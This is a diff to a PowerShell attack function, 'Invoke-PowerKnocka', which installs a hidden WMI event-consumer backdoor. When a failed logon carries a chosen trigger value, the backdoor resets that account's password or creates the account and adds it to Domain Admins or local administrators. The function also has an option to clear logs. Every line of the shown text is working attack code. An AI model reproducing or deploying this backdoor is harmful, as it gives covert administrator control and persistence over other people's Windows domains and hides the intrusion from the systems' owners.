@@ -24,14 +24,14 @@ function Invoke-PowerKnocka {
         [bool]$ClearLog = $false,
 
         [Parameter(Mandatory)]
-        [bool]$DomainKey
+        [bool]$NBName
     )
 
     if ($DC) {
-        $ExploitString = '-WindowStyle Hidden -NoP -NonI -c {$e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1;$n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq ' + $DomainKey + ') {if (Get-ADUser -Identity $n) {Set-ADAccountPassword -Identity $n -Reset -NewPassword (ConvertTo-SecureString -AsPlainText ' + $Password + '-Force)} else {New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString ' + $Password + '-AsPlainText -force);Add-ADGroupMember -Identity "Domain Admins" -Members $n}}}'
+        $ExploitString = '-WindowStyle Hidden -NoP -NonI $e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1; $n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq' + $NBName + ') {try{ Set-ADAccountPassword -Identity $n -Reset -NewPassword (ConvertTo-SecureString -AsPlainText ' + $Password + '-Force)} catch { New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString ' + $Password + 'AsPlainText -force);Add-ADGroupMember -Identity "Domain Admins" -Members $n}}'
     }
     else {
-        $ExploitString = '-WindowStyle Hidden -NoP -NonI -c {$e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1;$n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq ' + $DomainKey + ') {if (net user $n) {net user $n ' + $Password+ '} else {net user $n ' + $Password + ' /add;net localgroup administrators $n /add}}}'
+        $ExploitString = '-WindowStyle Hidden -NoP -NonI $e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1; $n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq ' + $NBName + ') {if (net user $n) {net user $n ' + $Password + '} else {net user $n ' + $Password + ' /add;net localgroup administrators $n /add}}'
     }
 
     if ($ClearLog) {
@@ -81,7 +81,7 @@ function Invoke-PowerKnocka {
         $wmiParams.Class = 'CommandLineEventConsumer'
         $wmiParams.Arguments = @{
             Name = $Name
-            CommandLineTemplate = $ExploitString
+            CommandLineTemplate = "powershell.exe " + $ExploitString
         }
         $consumerResult = Set-WmiInstance @wmiParams
 
